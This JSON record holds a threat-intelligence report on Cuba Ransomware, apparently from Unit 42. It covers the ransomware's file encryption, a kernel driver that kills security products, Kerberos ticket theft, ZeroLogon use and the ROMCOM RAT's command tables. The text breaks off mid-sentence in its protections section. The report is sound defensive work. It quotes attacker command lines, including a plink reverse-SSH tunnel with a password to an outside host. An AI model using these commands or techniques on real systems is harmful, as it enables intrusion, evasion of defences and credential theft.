{
    "id": "cac143a9-b4a5-4ad0-95b0-f2958b0fd992",
    "created_at": "2023-01-12T15:00:34.934248Z",
    "updated_at": "2025-03-27T02:14:05.06827Z",
    "deleted_at": null,
    "sha1_hash": "3cb1d7711e359fd5fd81b6ac187c03dc7bf0dde0",
    "title": "2022-08-10 - Novel News on Cuba Ransomware- Greetings From Tropical Scorpius",
    "authors": "",
    "file_creation_date": "2022-08-18T03:59:03Z",
    "file_modification_date": "2022-08-18T03:59:03Z",
    "file_size": 13721274,
    "plain_text": "# Novel News on Cuba Ransomware: Greetings From Tropical Scorpius\n\n**[unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/](https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/)**\n\nAnthony Galiette, Daniel Bunce, Doel Santos, Shawn Westfall August 9, 2022\n\nBy [Anthony Galiette,](https://unit42.paloaltonetworks.com/author/anthony-galiette/) [Daniel Bunce,](https://unit42.paloaltonetworks.com/author/daniel-bunce/) [Doel Santos and](https://unit42.paloaltonetworks.com/author/doel-santos/) [Shawn Westfall](https://unit42.paloaltonetworks.com/author/shawn-westfall/)\n\nAugust 9, 2022 at 9:00 AM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Ransomware](https://unit42.paloaltonetworks.com/category/ransomware/)\n\nTags: [Cloud-Delivered Security Services,](https://unit42.paloaltonetworks.com/tag/cloud-delivered-security-services/) [Cortex XDR,](https://unit42.paloaltonetworks.com/tag/cortex-xdr/) [Cuba Ransomware,](https://unit42.paloaltonetworks.com/tag/cuba-ransomware/) Investigation\nand Response, [ROMCOM RAT,](https://unit42.paloaltonetworks.com/tag/romcom-rat/) [threat intelligence,](https://unit42.paloaltonetworks.com/tag/threat-intelligence/) [threat prevention,](https://unit42.paloaltonetworks.com/tag/threat-prevention/) [Tropical Scorpius,](https://unit42.paloaltonetworks.com/tag/tropical-scorpius/)\n[UNC2596,](https://unit42.paloaltonetworks.com/tag/unc2596/) [WildFire](https://unit42.paloaltonetworks.com/tag/wildfire/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/cuba-ransomware-tropical-scorpius/)\n\n## Executive Summary\n\nBeginning in early May 2022, Unit 42 observed a threat actor deploying Cuba Ransomware\n[using novel tools and techniques. Using our naming schema, Unit 42 tracks the threat actor](https://unit42.paloaltonetworks.com/unit-42-threat-group-naming-update/)\nas Tropical Scorpius.\n\n\n-----\n\nHere, we start with an overview of the ransomware and focus on an evolution of behavior\nobserved leading up to deployment of Cuba Ransomware. While this behavior was\nconsistent for over a year, Unit 42 has observed some recent changes. This includes\nproviding an overview of the ransomware’s functionality and algorithms, as well as covering\nthe technical details of the tactics, techniques and procedures (TTPs) used by Tropical\nScorpius. Specifically, this involves:\n\nA new malware family that Unit 42 tracks as ROMCOM RAT.\nA weaponized local privilege escalation exploit to SYSTEM.\nA new Kerberos tool that Unit 42 tracks as KerberCache.\nA kernel driver for targeting security products.\nIdentifying the use of the ZeroLogon hacktool.\n\nPalo Alto Networks customers receive protections from the threats described in this blog\n[through our Cloud-Delivered Security Services, namely](https://www.paloaltonetworks.com/network-security/security-subscriptions) [Advanced Threat Prevention.](https://www.paloaltonetworks.com/network-security/advanced-threat-prevention)\n[Customers also receive protections from Cortex XDR and](https://www.paloaltonetworks.com/cortex/cortex-xdr) [WildFire malware analysis.](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\n\nIf you think you may have been impacted by a cyber incident, the Unit 42 Incident Response\nteam is available 24/7/365. You can also take preventative steps by requesting any of our\n[cyber risk management services.](https://www.paloaltonetworks.com/unit42/assess)\n\nFull visualization of the techniques observed, relevant courses of action and indicators of\n[compromise (IoCs) related to this report can be found in the Unit 42 ATOM viewer.](https://unit42.paloaltonetworks.com/atoms/tropicalscorpius/)\n\nRelated Unit 42 Topics Ransomware\n\nNames for threat actor group deploying Cuba Ransomware Tropical Scorpius, UNC2596\n\n## Table of Contents\n\nTropical Scorpius Overview: How Cuba Ransomware Has Been Deployed\n\nTropical Scorpius Victimology\n\nIndustrial Spy and Tropical Scorpius\n\nRansomware Functionality\n\nDefense Evasion\n\nLocal Privilege Escalation\n\nTicket to Lateral Movement\n\nTo Domain Admin\n\nCommand and Control\n\nROMCOM 2.0\nProtections and Mitigations\n\n\n-----\n\nConclusion\nIndicators of Compromise\n\nAdditional Resources\n\n## Tropical Scorpius Overview: How Cuba Ransomware Has Been Deployed\n\nThe Cuba Ransomware family first surfaced in December 2019. The threat actors behind this\nransomware family have since changed their tactics and tooling to become a more prevalent\n[threat in 2022. This ransomware has historically been distributed through Hancitor, which is](https://unit42.paloaltonetworks.com/hancitor-infections-cobalt-strike/)\nusually delivered through malicious attachments. Tropical Scorpius has also been observed\n[exploiting vulnerabilities in Microsoft Exchange Server, including ProxyShell and](https://unit42.paloaltonetworks.com/microsoft-exchange-server-attack-timeline/)\n[ProxyLogon.](https://msrc-blog.microsoft.com/2021/03/16/guidance-for-responders-investigating-and-remediating-on-premises-exchange-server-vulnerabilities/)\n\nThis ransomware group uses double extortion alongside a leak site that exposes\norganizations that have allegedly been compromised (Figures 1a and 1b). That said, this\ngroup didn’t have a leak site when first observed in 2019; we suspect the inspiration for\n[adding one came from other ransomware groups such as Maze and](https://unit42.paloaltonetworks.com/threat-brief-maze-ransomware-activities/) [REvil. The Cuba](https://unit42.paloaltonetworks.com/revil-threat-actors/)\nRansomware leak site also includes a paid section where the threat actors share leaks that\nwere sold to an interested party.\n\n\n-----\n\nFigure 1a. A screenshot from the leak site used by Cuba Ransomware, focused on the\ncontent the group makes freely available.\n\n\n-----\n\nFigure 1b. A screenshot of the section of the Cuba Ransomware group’s leak site where\ndata is offered for sale.\n\n## Tropical Scorpius Victimology\n\nThe most recent [Unit 42 Ransomware Threat Report includes observations of Cuba](https://start.paloaltonetworks.com/unit-42-ransomware-threat-report.html)\nRansomware impacting 33 organizations. As of July 2022, Tropical Scorpius has used Cuba\nRansomware to impact 27 additional organizations across multiple vectors, such as\nProfessional and Legal Services, State and Local Government, Manufacturing,\nTransportation and Logistics, Wholesale and Retail, Real Estate, Financial Services, Health\nCare, High Technology, Utilities and Energy, Construction, and Education. A total of 60\norganizations were exposed by this ransomware gang on its leak site since the group first\nsurfaced in 2019.\n\nWe suspect the number of victims is larger than the leak site shows since ransomware\noperators usually don’t release the data publicly if the victim pays the ransom. That said, the\n[FBI says the Cuba Ransomware gang made at least $43.9 million from ransom payments](https://www.ic3.gov/Media/News/2021/211203-2.pdf)\nand has demanded at least $74 million.\n\n\n-----\n\nFigure 2. Organizations appearing on the Cuba Ransomware leak site, distributed by\nindustry.\nWe observed that this ransomware gang’s leak site does not include as global a distribution\nof targeted organizations as other ransomware gangs operating right now. While leak sites\ndon’t reflect the actual number of victims impacted by this ransomware group, they still give\nus a general idea of a group’s targets and objectives. We noticed that out of the 60 victims\nlisted on the Cuba Ransomware leak site, 40 were located in the United States – 66% of the\ntotal number of allegedly breached organizations. By contrast, only about 30% of the\n[allegedly breached organizations on the LockBit leak site are located in the U.S.](https://unit42.paloaltonetworks.com/lockbit-2-ransomware/)\n\n\n-----\n\nFigure 3. Geographic distribution of organizations targeted by Cuba Ransomware, according\nto the group’s leak site.\n\n## Industrial Spy and Tropical Scorpius\n\n[In May 2022, BleepingComputer reported that the marketplace Industrial Spy was moving](https://www.bleepingcomputer.com/news/security/industrial-spy-data-extortion-market-gets-into-the-ransomware-game/)\ninto the ransomware business. After emerging in April 2022, Industrial Spy became known\nas a site where threat actors can sign up to buy stolen data from breached companies. The\nextension into ransomware, while a related type of malicious activity, also appears to have a\nconnection to Tropical Scorpius.\n\n\n-----\n\nFigure 4. Industrial Spy landing page.\nBleepingComputer reports that the ransom note used by Industrial Spy ransomware bears\nsubstantial resemblance to a Cuba ransom note, with both notes containing the exact same\ncontact information. It’s worth mentioning that ransomware groups usually copy ransom\nnotes from other groups for their own samples, but we believe there is more to this\nrelationship.\n\nUnit 42 observed a Cuba Ransomware payload used to encrypt the files on a compromised\nsystem, appending the .cuba extension to the files – but then observed that the exfiltrated\ndata was posted for sale on the Industrial Spy marketplace.\n\nWe are still unsure why the Tropical Scorpius threat actors decided to leverage the Industrial\nSpy marketplace rather than their own leak site; however, due to the findings published by\nBleepingComputer and this curious incident, we believe there is more involvement between\nthe two than originally thought.\n\n\n-----\n\n## Ransomware Functionality\n\nWhile it is clear the Tropical Scorpius threat actors are constantly developing and updating\ntheir toolkit, the core Cuba Ransomware payload has remained roughly the same since its\ndiscovery in 2019. The cryptographic algorithms are still taken from WolfSSL’s open source\nrepository, specifically ChaCha for file encryption and RSA for key encryption.\n\nFigure 5. Code overlap between Cuba Ransomware and WolfSSL’s RSA encrypt\nfunctionality.\nSimilarly to most ransomware families, Cuba Ransomware encrypts files differently\ndepending on their size. If the file is less than 0x200000 bytes in length, the entire file is\nencrypted. If not, Cuba Ransomware encrypts the files in chunks of 0x100000 bytes, with the\nbreak in between the encrypted chunks differing based on the overall size. For example, a\nfile with a size between 0x200000 bytes and 0xA00000 bytes will be modified in blocks of\n0x400000 bytes until the file’s end.\n\n\n-----\n\nFigure 6. Determination of chunk spacing prior to file encryption.\n\nFile Size Chunk Size Chunk Spacing\n\nLess than 0x200000 Entire Size N/A\n\nBetween 0x200000 & 0xA00000 0x100000 0x400000\n\nBetween 0xA00000 & 0x3200000 0x100000 0x800000\n\nBetween 0x3200000 & 0xC800000 0x100000 0x1000000\n\nBetween 0xC800000 & 0x280000000 0x100000 0xC800000\n\nGreater than 0x280000000 0x100000 0x1F400000\n\n_Table 1. Chunk spacing based on file sizes within Cuba Ransomware._\n\n\n-----\n\nEach encrypted file is also prepended with an initial 1024-byte header, containing the magic\nvalue FIDEL.CA (likely in reference to Fidel Castro, following the Cuba theme), followed by\nan RSA-4096 encrypted block containing the file-specific ChaCha key and nonce. After\nsuccessfully encrypting a file, the extension .cuba is appended to the filename.\n\nFigure 7. FIDEL.CA magic value followed by encrypted RSA blob.\nAs discussed by [Trend Micro, the developers of Cuba Ransomware have built onto the list of](https://www.trendmicro.com/en_us/research/22/f/cuba-ransomware-group-s-new-variant-found-using-optimized-infect.html)\ntargeted processes and services that will be terminated on runtime, as well as increasing the\nnumber of directories and extensions to avoid encrypting.\n\n**Targeted processes and services:**\n\nMySQL\nMySQL82SQLSERVERAGENT\n\nMSSQLSERVER\n\nSQLWriter\n\nSQLTELEMETRY\n\nMSDTC\n\nSQLBrowser\n\nsqlagent.exe\n\nsqlservr.exe\n\n\n-----\n\nsqlwriter.exe\nsqlceip.exe\n\nmsdtc.exe\n\nsqlbrowser.exe\n\nvmcompute\n\nvmms\n\nvmwp.exe\n\nvmsp.exe\n\noutlook.exe\n\nMSExchangeUMCR\n\nMSExchangeUM\n\nMSExchangeTransportLogSearch\n\nMSExchangeTransport\n\nMSExchangeThrottling\n\nMSExchangeSubmission\n\nMSExchangeServiceHost\n\nMSExchangeRPC\n\nMSExchangeRepl\n\nMSExchangePOP3BE\n\nMSExchangePop3\n\nMSExchangeNotificationsBroker\n\nMSExchangeMailboxReplication\n\nMSExchangeMailboxAssistants\n\nMSExchangeIS\n\nMSExchangeIMAP4BE\n\nMSExchangeImap4\n\nMSExchangeHMRecovery\n\nMSExchangeHM\n\nMSExchangeFrontEndTransport\n\nMSExchangeFastSearch\n\nMSExchangeEdgeSync\n\nMSExchangeDiagnostics\n\nMSExchangeDelivery\n\nMSExchangeDagMgmt\n\nMSExchangeCompliance\n\nMSExchangeAntispamUpdate\n\nMicrosoft.Exchange.Store.Worker.exe\n\n**Avoided directories:**\n\n\\windows\\\n\n\\program files\\microsoft office\\\n\n\\program files (x86)\\microsoft office\\\n\n\n-----\n\n\\program files\\avs\\\n\\program files (x86)\\avs\\\n\n\\$recycle.bin\\\n\n\\boot\\\n\n\\recovery\\\n\n\\system volume information\\\n\n\\msocache\\\n\n\\users\\all users\\\n\n\\users\\default user\\\n\n\\users\\default\\\n\n\\temp\\\n\n\\inetcache\\\n\n\\google\\\n\n**Avoided extensions:**\n\n.exe\n\n.dll\n\n.sys\n\n.ini\n\n.lnk\n\n.vbm\n\n.cuba\n\nAnother major update can be found within the ransom note dropped by the ransomware;\nrather than rely solely on their Tor site, they are also offering communication via TOX, which\nis slowly becoming more popular among ransomware groups due to its secure messaging\nfunctionality.\n\n\n-----\n\nFigure 8. Ransom note dropped by Cuba Ransomware group.\n\n## Defense Evasion\n\nUnit 42 observed Tropical Scorpius prior to the deployment of ransomware, using some\ninteresting tools and techniques to evade detection and move around in the compromised\nenvironment.\n\nTropical Scorpius leveraged a dropper that writes a kernel driver to the file system called\nApcHelper.sys. This targets and terminates security products. The dropper was not signed,\n[however, the kernel driver was signed using the certificate found in the LAPSUS NVIDIA](https://unit42.paloaltonetworks.com/lapsus-group/)\nleak.\n\n\n-----\n\nFigure 9. Kernel driver digital signature.\nUpon executing the kernel driver dropper/loader, the kernel dropper uses multiple Windows\nAPIs for finding the resource section and loading the resource type name called Driver. This\nis an embedded PE file and is the driver that will ultimately be written to the file system in\nsubsequent API calls.\n\nFigure 10. Kernel dropper resource section.\nAfter the kernel driver drops onto the file system, the loader will first run a deletion command\nargument via cmd.exe for the file path.\n\nAfter this, it will create a new service using cmd.exe and run the argument below to set up a\nservice for the kernel driver.\n\n\n-----\n\nThen the loader copies the kernel driver responsible for terminating security products onto\nthe file system.\n\nThe core functionality of the kernel driver dropped and loaded is to resolve additional kernel\nAPIs for performing functionality and targeting a list of security products for termination.\n\nThe additional APIs are resolved using a string constant for the desired API name; each\nWindows API below is used in a function call to MmGetSystemRoutineAddress for returning\na pointer to the function. Below is a list of additional kernel APIs resolved that were found\nwithin the sample.\n\nFigure 11. Kernel driver runtime APIs.\nThe list of security products targeted overlaps with the list of targets previously observed in\n[the tool called “BURNTCIGAR” as discussed by Mandiant. This particular kernel driver is a](https://www.mandiant.com/resources/unc2596-cuba-ransomware)\nvariant of what Mandiant observed.\n\n\n-----\n\nFigure 12. Security products targeted.\nAfter the additional APIs are resolved, the process of targeting security products begins\n(products targeted are in Figure 12 above). A do-while loop is set up (loop is shown in Figure\n13 below) with the objective of checking the processes running on the system to see if they\nmatch an item from the security products targeted. This naming check is performed by\nlooking up each ThreadID and calling the function PsLookupThreadByThreadId, which will\n[be used to find a pointer to the ETHREAD structure of the thread. The ETHREAD structure is](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/eprocess)\na kernel object maintaining various references to important process/thread structures and\nobjects needed by the operating system for tasking and execution by the CPU. The pointer\nto ETHREAD that is returned is used in the function PsIsThreadTerminating to make sure a\nthread is not terminating.\n\nThen if a thread object exists, to find the process the thread belongs to, the function\n[PsGetThreadProcess is used and the returned value is PEPROCESS. PEPROCESS is a](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2110%2021H2%20(November%202021%20Update)/_EPROCESS)\nkernel object representation of a process object which maintains pointers to where processrelated information is stored. If PEPROCESS does exist for the associated thread, the\nImageFileName offset is then assigned to a variable in the instance of the decompiled\noutput; this is the variable named “v3” in Figure 13. The variable “v3” will then have the\nprocess image file name for the current thread/process in the loop, which could be any active\nprocess on a computer system.\n\n\n-----\n\nThe next part of performing the name check is the inner if-then statement that uses two\nparameters in the strstr function. The first parameter is the process image filename from the\nPEPROCESS structure’s ImageFileName. The second parameter is a substring search of\nthe security product’s name to compare against the first parameter. (For example, does the\nname Sophos exist in the ImageFileName process name string?)\n\nIf there is a match, the next function, called sub_140001BE0 (shown being called in Figure\n13 below), will check if the status code of the thread is set to status pending. If this evaluates\nas true, then a subroutine will be called using ZwTerminateProcess for termination. The\nthread object will be dereferenced and the loop will continue to the next thread to start\nevaluating again for termination.\n\nFigure 13. Example of kernel driver decompiled.\nThe change of tactics by Tropical Scorpius is to make use of the expired legitimate NVIDIA\ncertificate, as well as use of their own driver targeting security products for termination. This\nis a noteworthy change compared to publicly observed exploitation of an undocumented\n\n\n-----\n\nIOCTL (Input/Output Control system calls) in previous versions of the vulnerable\nBURNTCIGAR driver.\n\n## Local Privilege Escalation\n\nThe local privilege escalation tool leveraged by Tropical Scorpius was initially downloaded\nfrom the web hosting platform tmpfiles[.]org by using PowerShell’s Invoke-WebRequest.\n\n[Unit 42 observed the actor leverage a binary that abused CVE-2022-24521, a vulnerability in](https://nvd.nist.gov/vuln/detail/CVE-2022-24521)\nthe Common Log File System (CLFS). The exploit abused a logic bug in CLFS.sys,\nspecifically in the CClfsBaseFilePersisted::LoadContainerQ() function. Malformed BLF files\nwere used to corrupt the pContainer field of a container context object with a user-mode\naddress to gain code execution. The code execution was used to steal the System token and\nelevate privileges. A detailed write-up of this vulnerability and the exploitation strategy was\n[provided by Sergey Kornienko of PixiePoint Security on April 25, 2022.](https://www.pixiepointsecurity.com/blog/nday-cve-2022-24521.html)\n\nThe Tropical Scorpius threat actor likely used this post as a guide to build the exploit since\nthe exploitation strategy used is identical to what Sergey described, including the pipe\nattributes heap exploitation method to spray the heap.\n\n[This technique was covered in detail by Corentin Bayet and Paul Fariello of Synactiv at the](https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf)\nSymposium on Information and Communications Technology Security (SSTIC) in 2020.\n\n## Ticket to Lateral Movement\n\nThe Tropical Scorpius threat actor leveraged various tools for the initial system\nreconnaissance. ADFind and Net Scan were downloaded from the web hosting platform\ntmpfiles[.]org by using PowerShell’s Invoke-WebRequest. Both tools were dropped onto the\nsame system with shortened names to obscure their purpose.\n\nCredential preparation and collection on lower-privilege systems was performed using a\nPowerShell-based script, GetUserSPNs.ps1. This particular script was observed on three\ndifferent systems, where it identified user accounts being used as service accounts. The\nthreat actor used this process to pinpoint accounts worth targeting for their associated Active\nDirectory Kerberos ticket, in order to collect and crack the Kerberos ticket offline via the\n[technique called Kerberoasting.](https://attack.mitre.org/techniques/T1558/003/)\n\nAdditional activity related to credential theft was observed approximately one week after the\nuse of GetUserSPNs.ps1, with the observation of Mimikatz on a user's workstation being\nwritten into the user’s document folder as a zipped file. Mimikatz is a well-known credential\ntheft tool that contains various options for targeting parts of the operating system where\ncredentials can potentially be found.\n\n\n-----\n\nAround the time that Mimikatz was observed, a custom hacktool was observed on another\nworkstation. This tool, intended for extracting cached Kerberos tickets from a host’s LSASS\nmemory, was dropped into a user’s documents folder.\n\nUnit 42 is naming the Kerberos tool used by Tropical Scorpius in terms of its overall\nobjective: KerberCache. A screenshot of the tool’s output was taken, displaying the parsed\ndata the tool generates (Figure 14).\n\nFigure 14. KerberCache ticket extraction example.\nUnder the hood, KerberCache will call the API LsaConnectUntrusted to get a handle used for\nsubsequent calls. Following the returned handle, the call to\nLsaLookupAuthenticationPackage is then given the package named Kerberos along with the\nhandle from the previous API call to LsaConnectUntrusted. If the function succeeds, it will\ncall the API LsaCallAuthenticationPackage. Below (Figure 15) is a snippet of the function’s\nflow once called and the decompiled formatting and parsing takes place.\n\n\n-----\n\nFigure 15. Ticket parsing decompiled example.\nUpon successful retrieval of cached Kerberos tickets, the ticket will be passed to a function\nfor base64-encoding the data and will be written to the current working directory in which the\ntool was executed. The naming convention output for the tool can be broken into the\nfollowing sections: [user@servername]_[encryption_type].[ticket_number].kirbi. The actual\nticket naming convention, when written to the file system, appears as the following example\noutput: krbtgt@CORP.INTERNAL_18.0.kirbi.\n\n\n-----\n\nFigure 16. Ticket encoding decompiled example.\n\n## To Domain Admin\n\nThe Domain Admin tool leveraged by Tropical Scorpius was initially downloaded from the\nweb hosting platform tmpfiles[.]org by using PowerShell’s Invoke-WebRequest. The sample\nwas packed using the Anti-VM features of Themida, a well-known commercial packing tool. It\nwas also masquerading as the filename Filezilla.\n\nUpon execution, if running in a virtualized environment, the packer will display the following\nmessage:\n\n\n-----\n\nFigure 17. Themida Anti-VM\n\nexample.\nThe unique commands associated with the hacktool provide high confidence Zero.exe is\n[ZeroLogon hacktool. The ZeroLogon hacktool is used to abuse CVE-2020-1472 to gain](https://nvd.nist.gov/vuln/detail/cve-2020-1472)\nDomain Administrator (DA) privileges by requesting an NTLM hash from the domain\ncontroller.\n\nFigure 18. ZeroLogon hacktool packed example.\nIt has been noted publicly that the ZeroLogon hacktool has gained popularity among other\nmalware families as part of their attack chain in the crimeware space with overlap on\n[intrusions related to Qbot and](https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/) [Hancitor.](https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/)\n\n## Command and Control\n\n\n-----\n\nAlongside the aforementioned tools, Unit 42 also discovered a custom remote access\nTrojan/backdoor containing a unique command and control (C2) protocol. Based on the\nstrings within the binary as well as the functionality, we’ve opted to name it ROMCOM RAT.\n\nROMCOM RAT can be executed through the use of one of its two exports:\n\nServiceMain\n\nstartWorker\n\nBoth exports lead to the execution of the same function; however, the difference is the string\npassed as a parameter: ServiceMain passes the string _inet, while startWorker passes the\nstring _file. Based on this string alone, the flow of execution within the sample is completely\ndifferent, with ServiceMain causing the sample to beacon out to its C2 server, and\nstartWorker resulting in the sample opening a backdoor on the system and waiting for\nconnections.\n\n### ServiceMain Export\n\nUpon execution of the ServiceMain export, ROMCOM will execute the following command\nline:\n\nC:\\\\Windows\\\\System32\\\\rundll32.exe\n\nC:\\\\Windows\\\\System32\\\\comDll.dll,startWorker\n\nThis will lead to the execution of the startWorker export, meaning both exports will be active\non a machine, presuming ROMCOM was initially executed through a service.\n\nFigure 19. Execution of ROMCOM sample through rundll32.exe with startWorker argument.\n\n\n-----\n\nFrom there, ROMCOM will gather system and user information, and attempt to send it to a\nhardcoded C2 server via the WinHTTP API. If this is successful, the response is parsed and\ndealt with accordingly.\n\nFigure 20. ICMP capabilities offered within ROMCOM.\n\n\n-----\n\nFigure 21. Command handling of the packet received from C2.\nIf the connection fails, ROMCOM attempts to connect to and communicate with the C2\nserver using ICMP requests. Using Windows API functions such as IcmpCreateFile() and\nIcmpSendEcho(), it will attempt to resend the system and user information to the server until\na response is received. Once a response is received, it is parsed in the same way the HTTP\nresponse will be parsed.\n\n\n-----\n\nFigure 22. ICMP request functionality.\nIf the fourth byte of the response is equal to 9, ROMCOM will sleep for 120,000 milliseconds.\nIf the fourth byte is set to 5, the response will contain a size for followup data, and so\nmemory is allocated before a second request is made to the C2, using either HTTP or ICMP\ndepending on the last protocol in use.\n\nThe received data from this second request is then passed into a function that first connects\nto the local address 127.0.0[.]3 over a port between 5555 and 5600, and then sends the C2\nreceived data. The function then returns, and then ROMCOM binds to 127.0.0[.]2:5555,\nwhere it will wait for a connection and forward any data received from that connection to its\nC2 server.\n\n\n-----\n\nFigure 23. Connecting to local socket server hosted by ROMCOM startWorker process.This\nleads nicely into a discussion of the startWorker export.\n\n### startWorker Export\n\nThe startWorker export passes the string _file to the main function of ROMCOM, which\nresults in the code executed by the ServiceMain export being skipped. Instead, startWorker\nbegins by opening a socket object and attempting to bind to the IP 127.0.0[.]3, and the port\n5555. However, if the port is already in use, ROMCOM will increment the port value and\nattempt to bind once again. This loop continues until ROMCOM has bound to an unused\nport, or until the port value reaches 5600, at which point it is set to 5554 and the loop\nrestarts.\n\n\n-----\n\nFigure 24. Setting up local socket server.Once ROMCOM has successfully bound to a port, it\nbegins listening for an incoming connection – this will be fulfilled by the process that\nexecuted the ServiceMain export. When an incoming connection is received, a thread will be\nspawned that will handle any requests from the connected client.\n\n\n-----\n\nFigure 25. Command handler.\nTable 2 can be seen below, containing the list of accepted commands and their purpose.\n\n\nCommand\nValue\n\n\nPurpose\n\n\n1 Return connected drive information\n\n2 Return file listings for specified directory\n\n3 Start up a reverse shell under the name svchelper.exe within the\n%ProgramData% folder\n\n4 Upload data to C2 as ZIP file, using IShellDispatch to copy files\n\n5 Download data and write to worker.txt in the %ProgramData% folder\n\n6 Delete a specified file\n\n7 Delete a specified directory\n\n8 Spawn a process with PID Spoofing\n\n\n-----\n\n9 Only handled by ServiceMain, received from C2 server and instructs the\nprocess to sleep for 120,000 ms\n\n10 Iterate through running processes and gather process IDs\n\n_Table 2. Supported backdoor commands and their functionality._\n\nEssentially, this particular execution structure results in the ROMCOM sample running as a\nservice receiving commands via HTTP/ICMP requests to and from its C2 servers, before\npassing those commands on to the ROMCOM sample that was executed through\nrundll32.exe. The commands are executed, with the results passed back to the serviceexecuted ROMCOM payload. Finally, the results are posted to the C2 server, either via an\nHTTP or ICMP request.\n\n### ROMCOM 2.0\n\nIt appears that ROMCOM is under active development, as we were able to discover a similar\nsample uploaded to VirusTotal (VT) on June 20, 2022, that was communicating to the same\nC2 server.\n\nThe original sample was dated April 10, 2022, while this sample had a file header timestamp\nof May 28, 2022, and was ~400 kb larger. It shared the same startWorker and ServiceMain\nexports; however, it also contained a third export denoted as startInet. It is important to note\nthe increase in debug strings found within the sample, which could indicate that the sample\nwas caught by antivirus software prior to development completion; this theory is further\nsupported by the VT uploader ID (22b3c7b0) having uploaded millions of files in the past,\nwhich rules out any one individual uploading it themselves.\n\nWithin this version, ServiceMain will execute the ROMCOM 2.0 sample twice, initially\nexecuting the startInet export, and then proceeding to execute the startWorker export.\nHowever, rather than simply calling CreateProcessA like the original ROMCOM sample, the\ndevelopers have placed a larger focus on using COM objects for execution.\n\nFigure 26. Execution of startInet and startWorker exports.\nEach process is spawned as a task on the system, using a variety of COM interfaces offered\nby the Task Scheduler. ROMCOM 2.0 will first get the tasks root folder by calling\nITaskService->GetFolder. It then deletes any existing tasks with the same name as the task\nthat will be created using ITaskFolder->DeleteTask.\n\n\n-----\n\nTask Name Export\n\ntask7 startInet\n\ntask6 startWorker\n\ntask1 startWorker – if not already running when startInet is executing\n\nTable 3. Names of tasks registered through the Task Scheduler COM interfaces.\n\nAn empty task is created with ITaskService->NewTask, and the security principal is then\nmodified using IPrincipal->put_Id to set the identifier as NT AUTHORITY\\\\SYSTEM, using\nIPrincipal->LogonType to set the logon type to TASK_LOGON_INTERACTIVE_TOKEN, and\nusing IPrincipal->put_RunLevel to set the run level as TASK_RUNLEVEL_HIGHEST.\n\nFigure 27. Task creation with SYSTEM privileges.\nA delay of 0 seconds is set for the task, using IRegistrationTrigger->PutDelay, indicated by\nthe string PT0S, resulting in the task executing immediately upon creation.\n\n\n-----\n\nFigure 28. Creation of task trigger, with delay set to 0 seconds.\nFinally, an action is set for the task, with the action path set to rundll32.exe and the argument\nset to C:\\\\Windows\\\\system32\\\\mskms.dll,ARGUMENT, where ARGUMENT is either\nstartWorker or startInet, depending on the export passed.\n\nFigure 29. Creation of task action, resulting in rundll32.exe executing mskms.dll.\nOnce registered, the task is triggered, which results in execution of the ROMCOM 2.0 main\nfunctionality. This follows the same structure as the original sample, with the startInet\nprocess reaching out to a hardcoded C2 server and passing any responses to the\nstartWorker process to handle accordingly. The developers have also expanded on the list of\nhandled commands, adding 10 more alongside the existing 10 commands. These include\ndownloading payloads specifically designed to take single or multiple screenshots of a\nsystem, as well as extracting a list of all installed programs to send back to the C2 (see the\nSCREENSHOOTER string reference shown in Figure 30).\n\n\n-----\n\nFigure 30. Downloading the described SCREENSHOOTER payload.\n\n\nCommand\nValue\n\n\nPurpose\n\n\n1 Return connected drive information\n\n2 Return file listings for specified directory\n\n3 Start up a reverse shell under the name winconhost.exe within the %TMP%\nfolder\n\n4 Upload data to C2 as ZIP file, using IShellDispatch to copy files\n\n5 Download data and write to worker.txt in the %TMP% folder\n\n6 Delete a specified file\n\n7 Delete a specified directory\n\n8 Spawn a process with PID Spoofing\n\n9 Only handled by startInet, received from C2 server and instructs the process\nto sleep for a random amount of time\n\n\n-----\n\n10 Get Process IDs of specific processes\n\n12 Execute rundll32.exe %TMP%\\\\PhotoDirector.dll,startWorker single and\nupload %TMP%\\\\PhotoDirector.zip to C2 server (likely used to take a single\nscreenshot)\n\n13 Execute rundll32.exe %TMP%\\\\PhotoDirector.dll,startWorker\n\n14 Upload %TMP%\\\\PhotoDirector.zip to C2 server\n\n15 Retrieve all running processes and process IDs\n\n16 Get list of installed software by querying\nSOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall or\nSOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\n\n18 Write received file SCREENSHOOTER to %TMP%\\\\PhotoDirector.dll\n\n19 Create %TMP%\\\\BrowserData folder, and write received file to\n%TMP%\\\\BrowserData\\\\explorer.exe before executing\n\n20 Write received file to and spawn %TMP%\\\\win_sshd.exe, described as\nFreeSSHd\n\n21 References plink.exe -ssh -pw AeM8soequ@ooNg -R 9999:4444\nponcho@CombinedResidency.org\\n, however appears to only execute\nC:\\\\Program Files (x86)\\\\freeSSHd\\\\FreeSSHDService.exe\n\n22 Terminate svcnet.exe, FreeSSHDService.exe, and plink.exe\n\n_Table 4. ROMCOM 2.0 supported commands._\n\n## Protections and Mitigations\n\nWe recommend leveraging the indicators of compromise (IoCs) below to identify any impacts\nto your organization.\n\nPalo Alto Networks detects and prevents Cuba Ransomware and Tropical Scorpius activity in\nthe following ways:\n\n[Cortex XDR with](https://www.paloaltonetworks.com/cortex/cortex-xdr)\n\nDetection for all indicators for Cuba Ransomware and related activity.\nAnti-Ransomware module to detect Cuba Ransomware encryption behaviors on\nWindows systems.\nLocal Analysis detection for Cuba Ransomware and ROMCOM RAT binaries on\nWindows environments.\nBehavioral Threat Protection rule prevents execution of related indicators.\n[WildFire: All known samples are identified as malware.](https://www.paloaltonetworks.com/products/secure-the-network/wildfire)\n\n\n-----\n\n[Threat Prevention provides protection against Tropical Scorpius infrastructure.](https://www.paloaltonetworks.com/products/secure-the-network/subscriptions/threat-prevention)\n[Advanced URL Filtering 